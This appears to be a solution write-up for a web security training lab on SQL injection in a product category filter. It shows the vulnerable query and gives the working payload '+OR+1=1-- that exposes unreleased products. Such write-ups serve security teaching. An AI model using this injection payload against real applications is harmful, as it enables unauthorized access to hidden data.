# Lab 01: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## Description

This lab contains an [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

---

## Solution

To cause the application to display the details of all products in **any category**, both **unreleased** and **released**, make an HTTP request to the following URI:

```txt
/filter?category='+OR+1=1--
```

Which produces the following SQL query:

```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```
